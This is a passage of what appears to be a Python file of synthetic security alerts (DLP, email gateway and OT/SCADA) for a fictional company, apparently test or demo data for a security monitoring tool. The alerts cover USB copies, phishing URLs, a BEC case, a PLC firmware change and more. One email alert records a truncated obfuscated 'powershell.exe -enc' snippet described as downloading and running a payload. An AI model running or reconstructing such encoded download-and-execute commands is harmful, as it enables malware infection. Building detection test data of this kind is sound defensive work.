            "timestamp": "2025-09-18T15:15:09.521Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Cloud Storage",
            "file_details": {
                "file_path": "C:\\Users\\a.smith\\Documents\\Q3_Customer_Leads.xlsx",
                "file_hash_sha256": "b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2",
                "classification_tags": ["PII", "Customers"]
            },
            "transfer_details": {
                "application": "Dropbox.exe",
                "url": "https://api.dropbox.com/content/upload"
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-07-Internal-Credit-Card-Number-Transfer",
        "rule_name": "Internal credit card number transfer",
        "alert_date": "2025-09-18T15:20:45Z",
        "tags": ["pci", "credit-card", "chat-application"],
        "severity": "Low",
        "reference": "User j.doe sent sensitive info in internal chat",
        "description": "User j.doe sent a string resembling a credit card number via internal instant messaging. Even though internal, it still violates PCI DSS policy.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "chat-message"},
            {"type": "data_classification", "value": "PCI"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T15:20:44.912Z",
            "event_type": "DataTransfer",
            "data_source": "Chat Application",
            "data_destination": "Internal Chat",
            "transfer_details": {
                "application": "Teams.exe",
                "message_text": "Order 456789 payment failed, try this card 4123-4567-8901-2345"
            },
            "data_match": {
                "pattern": "Credit Card Number",
                "value_redacted": "4123-XXXX-XXXX-2345"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    }
]
dlp_alert.extend([
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-08-Financial-Record-Transfer-to-USB",
        "rule_name": "Financial records copied to removable device",
        "alert_date": "2025-09-18T15:25:55Z",
        "tags": ["finance", "exfiltration", "usb"],
        "severity": "High",
        "reference": "User j.doe copied corporate financial report to USB drive",
        "description": "Detected user j.doe copying an Excel file containing quarterly corporate financial data to a removable storage device attached to FIN-WKS-JDOE-05.",
        "artifact": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "file-copy-to-usb"},
            {"type": "data_classification", "value": "Financial"},
            {"type": "file_name", "value": "Q3_Financial_Report.xlsx"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T15:25:54.660Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Removable Media",
            "file_details": {
                "file_path": "C:\\Users\\j.doe\\Documents\\Reports\\Q3_Financial_Report.xlsx",
                "file_hash_sha256": "c3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4",
                "classification_tags": ["Financial", "Confidential"]
            },
            "transfer_details": {
                "device_type": "USB-Drive",
                "device_serial": "A1B2C3D4E5F6"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-09-Source-Code-Upload-to-Pastebin",
        "rule_name": "Source code uploaded to public site",
        "alert_date": "2025-09-18T15:30:15Z",
        "tags": ["source-code", "exfiltration", "web"],
        "severity": "Critical",
        "reference": "R&D employee posted source code to public site",
        "description": "Detected an R&D user attempting to upload a text snippet containing proprietary source code to pastebin.com—serious data exfiltration risk.",
        "artifact": [
            {"type": "username", "value": "d.chen"},
            {"type": "hostname", "value": "DEV-WKS-DCHEN-12"},
            {"type": "ip", "value": "10.10.3.25"},
            {"type": "action", "value": "web-upload"},
            {"type": "data_classification", "value": "Proprietary Source Code"},
            {"type": "destination_domain", "value": "pastebin.com"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dev12",
            "timestamp": "2025-09-18T15:30:14.981Z",
            "event_type": "DataTransfer",
            "data_source": "Clipboard",
            "data_destination": "Web",
            "data_details": {
                "extracted_content_hash": "e1f2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2",
                "classification_tags": ["Proprietary Code", "Project-Nova"]
            },
            "transfer_details": {
                "application": "chrome.exe",
                "url": "https://pastebin.com/post"
            },
            "user_details": {"username": "d.chen", "domain": "MYCORP"},
            "device_details": {"hostname": "DEV-WKS-DCHEN-12", "ip_address": "10.10.3.25"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-08-Financial-Record-Transfer-to-USB",
        "rule_name": "Financial records copied to removable device",
        "alert_date": "2025-09-19T09:40:20Z",
        "tags": ["finance", "exfiltration", "usb"],
        "severity": "High",
        "reference": "User p.smith copied customer database file to USB drive",
        "description": "Detected user p.smith copying a SQL file containing a customer database to a removable storage device attached to FIN-WKS-PSMITH-07.",
        "artifact": [
            {"type": "username", "value": "p.smith"},
            {"type": "hostname", "value": "FIN-WKS-PSMITH-07"},
            {"type": "action", "value": "file-copy-to-usb"},
            {"type": "data_classification", "value": "Customer Data"},
            {"type": "file_name", "value": "customer_database.sql"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance07",
            "timestamp": "2025-09-19T09:40:19.500Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Removable Media",
            "file_details": {
                "file_path": "C:\\Users\\p.smith\\Documents\\customer_database.sql",
                "file_hash_sha256": "d8e9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9",
                "classification_tags": ["Customer Data", "PII"]
            },
            "transfer_details": {
                "device_type": "USB-Drive",
                "device_serial": "X9Y8Z7A6B5C4"
            },
            "user_details": {"username": "p.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-PSMITH-07", "ip_address": "192.168.1.115"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-09-Source-Code-Upload-to-Pastebin",
        "rule_name": "Source code uploaded to public site",
        "alert_date": "2025-09-19T10:15:30Z",
        "tags": ["source-code", "exfiltration", "web"],
        "severity": "Critical",
        "reference": "R&D employee posted source code to public site",
        "description": "Detected an R&D user attempting to upload a text snippet containing proprietary source code to github.com—serious data exfiltration risk.",
        "artifact": [
            {"type": "username", "value": "l.wang"},
            {"type": "hostname", "value": "DEV-WKS-LWANG-08"},
            {"type": "ip", "value": "10.10.3.51"},
            {"type": "action", "value": "web-upload"},
            {"type": "data_classification", "value": "Proprietary Source Code"},
            {"type": "destination_domain", "value": "github.com"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dev08",
            "timestamp": "2025-09-19T10:15:29.876Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Web",
            "data_details": {
                "extracted_content_hash": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                "classification_tags": ["Proprietary Code", "Project-Phoenix"]
            },
            "transfer_details": {
                "application": "git.exe",
                "url": "https://github.com/mycorp/project-phoenix"
            },
            "user_details": {"username": "l.wang", "domain": "MYCORP"},
            "device_details": {"hostname": "DEV-WKS-LWANG-08", "ip_address": "10.10.3.51"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-08-Financial-Record-Transfer-to-USB",
        "rule_name": "Financial records copied to removable device",
        "alert_date": "2025-09-19T11:02:10Z",
        "tags": ["finance", "exfiltration", "usb"],
        "severity": "High",
        "reference": "User s.jones copied payroll spreadsheet to USB drive",
        "description": "Detected user s.jones copying an Excel file containing employee payroll information to a removable storage device attached to FIN-WKS-SJONES-09.",
        "artifact": [
            {"type": "username", "value": "s.jones"},
            {"type": "hostname", "value": "FIN-WKS-SJONES-09"},
            {"type": "action", "value": "file-copy-to-usb"},
            {"type": "data_classification", "value": "Payroll"},
            {"type": "file_name", "value": "employee_salaries.xlsx"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance09",
            "timestamp": "2025-09-19T11:02:09.910Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Removable Media",
            "file_details": {
                "file_path": "C:\\Users\\s.jones\\Documents\\Payroll\\employee_salaries.xlsx",
                "file_hash_sha256": "b1a2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2",
                "classification_tags": ["Payroll", "Confidential"]
            },
            "transfer_details": {
                "device_type": "USB-Drive",
                "device_serial": "T7U6V5W4X3Y2"
            },
            "user_details": {"username": "s.jones", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-SJONES-09", "ip_address": "192.168.1.120"}
        }
    }
])

mail_alert = [
    {
        "source": "Email",
        "rule_id": "ES-Rule-01-Phishing-URL-Detected",
        "rule_name": "Phishing URL detected in email",
        "alert_date": "2025-09-18T16:20:10Z",
        "tags": ["phishing", "url-threat"],
        "severity": "High",
        "reference": "User j.doe received phishing email with malicious URL",
        "description": "User j.doe received an email masquerading as a bank notice containing a malicious link to a known phishing site.",
        "artifact": [
            {"type": "recipient_email", "value": "j.doe@mycorp.com"},
            {"type": "sender_email", "value": "noreply@mybank-secure.net"},
            {"type": "subject", "value": "Your account has been suspended, please verify immediately"},
            {"type": "url", "value": "http://mybank-login-secure.com/verify?id=1a2b3c4d"},
            {"type": "threat_type", "value": "Phishing"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-18T16:20:09.543Z",
            "event_type": "URLScan",
            "detection_details": {
                "url": "http://mybank-login-secure.com/verify?id=1a2b3c4d",
                "verdict": "Malicious",
                "reason": "Threat intelligence match",
                "threat_name": "Fake Bank Login Page"
            },
            "email_details": {
                "sender": "noreply@mybank-secure.net",
                "recipient": "j.doe@mycorp.com",
                "subject": "Your account has been suspended, please verify immediately"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-02-Malicious-Attachment-Detected",
        "rule_name": "Malicious attachment detected in email",
        "alert_date": "2025-09-18T16:25:35Z",
        "tags": ["malware", "attachment", "ransomware"],
        "severity": "Critical",
        "reference": "User a.smith received email with malicious macro document",
        "description": "Email to user a.smith contained a Word document analyzed as ransomware by sandbox; the document attempted to execute a malicious macro.",
        "artifact": [
            {"type": "recipient_email", "value": "a.smith@mycorp.com"},
            {"type": "sender_email", "value": "invoice@supplier-online.co.kr"},
            {"type": "subject", "value": "Important: Invoice #20250918"},
            {"type": "file_name", "value": "Invoice-20250918.docm"},
            {"type": "file_hash_sha256", "value": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1"},
            {"type": "threat_type", "value": "Ransomware"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-02",
            "timestamp": "2025-09-18T16:25:34.888Z",
            "event_type": "AttachmentScan",
            "detection_details": {
                "file_name": "Invoice-20250918.docm",
                "file_hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
                "verdict": "Malicious",
                "reason": "Sandbox analysis (macro execution)",
                "threat_name": "Qbot"
            },
            "email_details": {
                "sender": "invoice@supplier-online.co.kr",
                "recipient": "a.smith@mycorp.com",
                "subject": "Important: Invoice #20250918"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-03-BEC-Spoofing-CEO",
        "rule_name": "Business Email Compromise (BEC) - CEO impersonation",
        "alert_date": "2025-09-18T16:30:40Z",
        "tags": ["bec", "spoofing", "financial-fraud"],
        "severity": "High",
        "reference": "Spoofed CEO email requested urgent wire transfer",
        "description": "Email impersonating company CEO (j.smith@mycorp.com) requested finance employee j.doe to urgently execute a wire transfer. Display name matched CEO but sender domain was external.",
        "artifact": [
            {"type": "recipient_email", "value": "j.doe@mycorp.com"},
            {"type": "sender_display_name", "value": "John Smith"},
            {"type": "sender_email", "value": "john.smith.ceo@outlook.com"},
            {"type": "subject", "value": "Urgent wire transfer request"},
            {"type": "threat_type", "value": "BEC"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-03",
            "timestamp": "2025-09-18T16:30:39.901Z",
            "event_type": "BECDetection",
            "detection_details": {
                "spoofed_user": "j.smith@mycorp.com",
                "sender_email": "john.smith.ceo@outlook.com",
                "reason": "Sender domain mismatch, display name impersonation, urgency keywords detected."
            },
            "email_details": {
                "sender": "john.smith.ceo@outlook.com",
                "recipient": "j.doe@mycorp.com",
                "subject": "Urgent wire transfer request"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-04-Credential-Phishing-Page",
        "rule_name": "Credential phishing page link",
        "alert_date": "2025-09-18T16:35:15Z",
        "tags": ["phishing", "credential-harvesting", "url-threat"],
        "severity": "High",
        "reference": "User d.chen received phishing email linking to fake Office login page",
        "description": "User d.chen received an email claiming 'Your Office 365 password is about to expire'; embedded link pointed to a phishing site mimicking the company login page.",
        "artifact": [
            {"type": "recipient_email", "value": "d.chen@mycorp.com"},
            {"type": "sender_email", "value": "admin@microsoft.co.us"},
            {"type": "subject", "value": "Update your password now to avoid account lockout"},
            {"type": "url", "value": "https://office365-mycorp-login.net/signin"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-18T16:35:14.678Z",
            "event_type": "URLScan",
            "detection_details": {
                "url": "https://office365-mycorp-login.net/signin",
                "verdict": "Malicious",
                "reason": "URL impersonation pattern, known phishing site"
            },
            "email_details": {
                "sender": "admin@microsoft.co.us",
                "recipient": "d.chen@mycorp.com",
                "subject": "Update your password now to avoid account lockout"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-05-Fileless-Malware-Detected",
        "rule_name": "Fileless malware detected in email",
        "alert_date": "2025-09-18T16:40:50Z",
        "tags": ["malware", "fileless", "powershell"],
        "severity": "High",
        "reference": "User h.lin received email containing suspicious PowerShell command",
        "description": "User h.lin received an email whose body or attachment contained an obfuscated PowerShell command intended to download and execute a malicious payload without a traditional file attachment.",
        "artifact": [
            {"type": "recipient_email", "value": "h.lin@mycorp.com"},
            {"type": "sender_email", "value": "updates@newsletters.xyz"},
            {"type": "subject", "value": "Latest company news"},
            {"type": "command_line_snippet", "value": "powershell.exe -enc VwByAGkAdABlAC0ASABv..."},
            {"type": "threat_type", "value": "Fileless Malware"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-02",
            "timestamp": "2025-09-18T16:40:49.123Z",
            "event_type": "ContentScan",
            "detection_details": {
                "detection_method": "Signature/Behavioral",
                "reason": "Detected obfuscated PowerShell command in email body"
            },
            "email_details": {
                "sender": "updates@newsletters.xyz",
                "recipient": "h.lin@mycorp.com",
                "subject": "Latest company news"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-06-Suspicious-Login-Attempt-Notification",
        "rule_name": "Suspicious login attempt phishing email",
        "alert_date": "2025-09-18T16:45:22Z",
        "tags": ["phishing", "social-engineering"],
        "severity": "Medium",
        "reference": "User m.li received suspicious login notification phishing email",
        "description": "Email to user m.li claimed a 'login attempt from an unknown device' and urged clicking a link to 'protect your account now'; sender not from an official source.",
        "artifact": [
            {"type": "recipient_email", "value": "m.li@mycorp.com"},
            {"type": "sender_email", "value": "security-alert@service.online-secure.ru"},
            {"type": "subject", "value": "Alert: Login from a new device!"},
            {"type": "threat_type", "value": "Phishing"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-03",
            "timestamp": "2025-09-18T16:45:21.567Z",
            "event_type": "PhishingAttempt",
            "detection_details": {
                "reason": "Social engineering keywords, non-corporate sender, urgency in subject"
            },
            "email_details": {
                "sender": "security-alert@service.online-secure.ru",
                "recipient": "m.li@mycorp.com",
                "subject": "Alert: Login from a new device!"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-07-Domain-Spoofing-HR-Team",
        "rule_name": "Email domain spoofing - HR team",
        "alert_date": "2025-09-18T16:50:05Z",
        "tags": ["spoofing", "credential-harvesting"],
        "severity": "Medium",
        "reference": "Spoofed HR team email sent to all employees",
        "description": "Email impersonating the HR team (hr@mycorp.com) used similar domain (hr@mycorps.com) and requested employees update personal information.",
        "artifact": [
            {"type": "recipient_email", "value": "all@mycorp.com"},
            {"type": "sender_email", "value": "hr@mycorps.com"},
            {"type": "subject", "value": "Please update your employee information to receive new benefits"},
            {"type": "spoofed_domain", "value": "mycorp.com"},
            {"type": "threat_type", "value": "Domain Spoofing"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-18T16:50:04.990Z",
            "event_type": "SpoofingDetection",
            "detection_details": {
                "reason": "DMARC/SPF/DKIM failed, domain similarity detected",
                "spoofed_domain": "mycorp.com",
                "sender_domain": "mycorps.com"
            },
            "email_details": {
                "sender": "hr@mycorps.com",
                "recipient": "all@mycorp.com",
                "subject": "Please update your employee information to receive new benefits"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-08-Suspicious-Archive-Attachment",
        "rule_name": "Suspicious compressed attachment",
        "alert_date": "2025-09-18T16:55:18Z",
        "tags": ["malware", "attachment", "archive"],
        "severity": "Medium",
        "reference": "User c.jones received password-protected archive attachment",
        "description": "Email to user c.jones had a password-protected ZIP file with the password in the body—a technique often used to evade security scanning.",
        "artifact": [
            {"type": "recipient_email", "value": "c.jones@mycorp.com"},
            {"type": "sender_email", "value": "support@data-service.ru"},
            {"type": "subject", "value": "Data request response"},
            {"type": "file_name", "value": "report.zip"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-02",
            "timestamp": "2025-09-18T16:55:17.345Z",
            "event_type": "AttachmentScan",
            "detection_details": {
                "file_name": "report.zip",
                "verdict": "Suspicious",
                "reason": "Password-protected archive, password provided in body"
            },
            "email_details": {
                "sender": "support@data-service.ru",
                "recipient": "c.jones@mycorp.com",
                "subject": "Data request response"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-09-Internal-Account-Compromise",
        "rule_name": "Compromised internal account sending spam",
        "alert_date": "2025-09-18T17:00:00Z",
        "tags": ["compromised-account", "spam"],
        "severity": "High",
        "reference": "Compromised internal account j.doe sending high volume spam",
        "description": "Internal account j.doe@mycorp.com sent a high volume of spam messages—account likely compromised and used to distribute malicious content.",
        "artifact": [
            {"type": "sender_email", "value": "j.doe@mycorp.com"},
            {"type": "source_ip", "value": "8.8.8.8"},
            {"type": "subject", "value": "Secret to earning huge profits"},
            {"type": "threat_type", "value": "Spam/Account Compromise"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-03",
            "timestamp": "2025-09-18T16:59:59.000Z",
            "event_type": "SpamDetection",
            "detection_details": {
                "reason": "High volume of spam messages, source IP mismatch with corporate network"
            },
            "email_details": {
                "sender": "j.doe@mycorp.com",
                "recipient": "various-external-recipients",
                "subject": "Secret to earning huge profits"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-10-Payload-Delivery-through-Image",
        "rule_name": "Malicious payload hidden in image",
        "alert_date": "2025-09-18T17:05:30Z",
        "tags": ["steganography", "malware"],
        "severity": "High",
        "reference": "User a.smith received image with steganographic malicious code",
        "description": "Email to user a.smith contained an image (JPG) that, upon deep content inspection, was found to hide malicious code via steganography.",
        "artifact": [
            {"type": "recipient_email", "value": "a.smith@mycorp.com"},
            {"type": "sender_email", "value": "photo-share@online-gallery.biz"},
            {"type": "subject", "value": "You have a new photo to view"},
            {"type": "file_name", "value": "photo.jpg"},
            {"type": "threat_type", "value": "Steganography"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-18T17:05:29.876Z",
            "event_type": "AttachmentScan",
            "detection_details": {
                "file_name": "photo.jpg",
                "verdict": "Malicious",
                "reason": "Steganography detection, hidden code payload found"
            },
            "email_details": {
                "sender": "photo-share@online-gallery.biz",
                "recipient": "a.smith@mycorp.com",
                "subject": "You have a new photo to view"
            }
        }
    }
]

mail_alert.extend([
    {
        "source": "Email",
        "rule_id": "ES-Rule-01-Phishing-URL-Detected",
        "rule_name": "Phishing URL detected in email",
        "alert_date": "2025-09-18T16:20:10Z",
        "tags": ["phishing", "url-threat"],
        "severity": "High",
        "reference": "User j.doe received phishing email with malicious URL",
        "description": "User j.doe received an email masquerading as a bank notice containing a malicious link to a known phishing site.",
        "artifact": [
            {"type": "recipient_email", "value": "j.doe@mycorp.com"},
            {"type": "sender_email", "value": "noreply@mybank-secure.net"},
            {"type": "subject", "value": "Your account has been suspended, please verify immediately"},
            {"type": "url", "value": "http://mybank-login-secure.com/verify?id=1a2b3c4d"},
            {"type": "threat_type", "value": "Phishing"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-18T16:20:09.543Z",
            "event_type": "URLScan",
            "detection_details": {
                "url": "http://mybank-login-secure.com/verify?id=1a2b3c4d",
                "verdict": "Malicious",
                "reason": "Threat intelligence match",
                "threat_name": "Fake Bank Login Page"
            },
            "email_details": {
                "sender": "noreply@mybank-secure.net",
                "recipient": "j.doe@mycorp.com",
                "subject": "Your account has been suspended, please verify immediately"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-02-Malicious-Attachment-Detected",
        "rule_name": "Malicious attachment detected in email",
        "alert_date": "2025-09-18T16:25:35Z",
        "tags": ["malware", "attachment", "ransomware"],
        "severity": "Critical",
        "reference": "User a.smith received email with malicious macro document",
        "description": "Email to user a.smith contained a Word document analyzed as ransomware by sandbox; the document attempted to execute a malicious macro.",
        "artifact": [
            {"type": "recipient_email", "value": "a.smith@mycorp.com"},
            {"type": "sender_email", "value": "invoice@supplier-online.co.kr"},
            {"type": "subject", "value": "Important: Invoice #20250918"},
            {"type": "file_name", "value": "Invoice-20250918.docm"},
            {"type": "file_hash_sha256", "value": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1"},
            {"type": "threat_type", "value": "Ransomware"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-02",
            "timestamp": "2025-09-18T16:25:34.888Z",
            "event_type": "AttachmentScan",
            "detection_details": {
                "file_name": "Invoice-20250918.docm",
                "file_hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
                "verdict": "Malicious",
                "reason": "Sandbox analysis (macro execution)",
                "threat_name": "Qbot"
            },
            "email_details": {
                "sender": "invoice@supplier-online.co.kr",
                "recipient": "a.smith@mycorp.com",
                "subject": "Important: Invoice #20250918"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-01-Phishing-URL-Detected",
        "rule_name": "Phishing URL detected in email",
        "alert_date": "2025-09-19T09:10:00Z",
        "tags": ["phishing", "url-threat"],
        "severity": "High",
        "reference": "User s.jones received phishing email with malicious URL",
        "description": "User s.jones received an email masquerading as a payroll system notice containing a malicious link to a known phishing site.",
        "artifact": [
            {"type": "recipient_email", "value": "s.jones@mycorp.com"},
            {"type": "sender_email", "value": "hr-notifications@mycorp-payroll.com"},
            {"type": "subject", "value": "Payroll change notice: please review now"},
            {"type": "url", "value": "http://mycorp-payroll-update.net/login"},
            {"type": "threat_type", "value": "Phishing"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-19T09:09:59.123Z",
            "event_type": "URLScan",
            "detection_details": {
                "url": "http://mycorp-payroll-update.net/login",
                "verdict": "Malicious",
                "reason": "Threat intelligence match",
                "threat_name": "Fake HR Login Page"
            },
            "email_details": {
                "sender": "hr-notifications@mycorp-payroll.com",
                "recipient": "s.jones@mycorp.com",
                "subject": "Payroll change notice: please review now"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-02-Malicious-Attachment-Detected",
        "rule_name": "Malicious attachment detected in email",
        "alert_date": "2025-09-19T10:30:45Z",
        "tags": ["malware", "attachment", "trojan"],
        "severity": "Critical",
        "reference": "User l.chen received email with malicious executable",
        "description": "Email to user l.chen had a compressed file analyzed as Trojan malware; file impersonated a software update.",
        "artifact": [
            {"type": "recipient_email", "value": "l.chen@mycorp.com"},
            {"type": "sender_email", "value": "support@software-update.ru"},
            {"type": "subject", "value": "Software update notification"},
            {"type": "file_name", "value": "Software_Update_v3.2.zip"},
            {"type": "file_hash_sha256", "value": "f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1"},
            {"type": "threat_type", "value": "Trojan"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-02",
            "timestamp": "2025-09-19T10:30:44.777Z",
            "event_type": "AttachmentScan",
            "detection_details": {
                "file_name": "Software_Update_v3.2.zip",
                "file_hash_sha256": "f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c1b2a3f4e5d6c7b8a9f0e1",
                "verdict": "Malicious",
                "reason": "Sandbox analysis (PE file extraction)",
                "threat_name": "Trickbot"
            },
            "email_details": {
                "sender": "support@software-update.ru",
                "recipient": "l.chen@mycorp.com",
                "subject": "Software update notification"
            }
        }
    },
    {
        "source": "Email",
        "rule_id": "ES-Rule-01-Phishing-URL-Detected",
        "rule_name": "Phishing URL detected in email",
        "alert_date": "2025-09-19T11:45:22Z",
        "tags": ["phishing", "url-threat"],
        "severity": "High",
        "reference": "User d.wang received phishing email with malicious URL",
        "description": "User d.wang received an email masquerading as an invoice notice containing a malicious link to a known phishing site.",
        "artifact": [
            {"type": "recipient_email", "value": "d.wang@mycorp.com"},
            {"type": "sender_email", "value": "billing-support@invoices-secure.com"},
            {"type": "subject", "value": "Invoice reminder #INV-87654"},
            {"type": "url", "value": "http://invoices-update.info/view-invoice/87654"},
            {"type": "threat_type", "value": "Phishing"}
        ],
        "raw_log": {
            "gateway_id": "email-gw-01",
            "timestamp": "2025-09-19T11:45:21.999Z",
            "event_type": "URLScan",
            "detection_details": {
                "url": "http://invoices-update.info/view-invoice/87654",
                "verdict": "Malicious",
                "reason": "Threat intelligence match",
                "threat_name": "Fake Invoice Portal"
            },
            "email_details": {
                "sender": "billing-support@invoices-secure.com",
                "recipient": "d.wang@mycorp.com",
                "subject": "Invoice reminder #INV-87654"
            }
        }
    }
])

ot_alert = [
    {
        "source": "OT",
        "rule_id": "OT-Rule-01-PLC-Configuration-Change",
        "rule_name": "Unauthorized PLC configuration change",
        "alert_date": "2025-09-18T17:10:00Z",
        "tags": ["plc", "unauthorized-change", "firmware"],
        "severity": "Critical",
        "reference": "Unauthorized configuration change on production line PLC01",
        "description": "Detected unauthorized modification to firmware or configuration of production line PLC-PROD-01—may cause process disruption or safety risk.",
        "artifact": [
            {"type": "device_id", "value": "PLC-PROD-01"},
            {"type": "ip", "value": "10.1.1.10"},
            {"type": "protocol", "value": "S7Comm"},
            {"type": "change_type", "value": "PLC-Firmware-Update"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T17:09:59.321Z",
            "event_type": "DeviceConfigurationChange",
            "device_details": {"device_id": "PLC-PROD-01", "ip_address": "10.1.1.10", "vendor": "Siemens"},
            "change_details": {"type": "firmware-update", "status": "succeeded", "source_ip": "10.1.2.55", "user": "system"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-02-Unusual-Protocol-Activity",
        "rule_name": "Suspicious protocol activity in SCADA network",
        "alert_date": "2025-09-18T17:15:30Z",
        "tags": ["protocol", "network-anomaly", "scada"],
        "severity": "Medium",
        "reference": "Unusual RDP connection observed in SCADA network",
        "description": "Host SCADA-HMI-05 in SCADA segment initiated an RDP connection to an unknown host—RDP is atypical for SCADA production communications.",
        "artifact": [
            {"type": "source_device", "value": "SCADA-HMI-05"},
            {"type": "source_ip", "value": "10.1.1.20"},
            {"type": "destination_ip", "value": "10.1.50.123"},
            {"type": "protocol", "value": "RDP", "port": 3389}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line02",
            "timestamp": "2025-09-18T17:15:29.876Z",
            "event_type": "NetworkFlow",
            "flow_details": {
                "source_ip": "10.1.1.20",
                "destination_ip": "10.1.50.123",
                "destination_port": 3389,
                "protocol": "TCP"
            },
            "network_context": {"segment": "SCADA-Network-Zone", "reason": "Unusual protocol for this segment"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-03-Controller-Stop-Command",
        "rule_name": "Controller received stop command",
        "alert_date": "2025-09-18T17:20:10Z",
        "tags": ["controller", "process-interruption", "stop-command"],
        "severity": "Critical",
        "reference": "Controller ROB-ARM-03 received stop command",
        "description": "Production robot controller ROB-ARM-03 received a stop command outside normal operating schedule or from an unauthorized source.",
        "artifact": [
            {"type": "device_id", "value": "ROB-ARM-03"},
            {"type": "ip", "value": "10.1.1.30"},
            {"type": "command", "value": "stop"}
        ],
        "raw_log": {
            "sensor_id": "ot-sensor-line01",
            "timestamp": "2025-09-18T17:20:09.555Z",
            "event_type": "ControlCommand",
            "device_details": {"device_id": "ROB-ARM-03", "ip_address": "10.1.1.30"},
            "command_details": {"action": "stop-command", "source_ip": "10.1.1.20"}
        }
    },
    {
        "source": "OT",
        "rule_id": "OT-Rule-04-Unauthorized-External-Access",
        "rule_name": "Unauthorized external access to production network",
        "alert_date": "2025-09-18T17:25:45Z",
        "tags": ["external-access", "remote-access", "vpn"],
        "severity": "Critical",
        "reference": "Unauthorized access attempt from external IP",
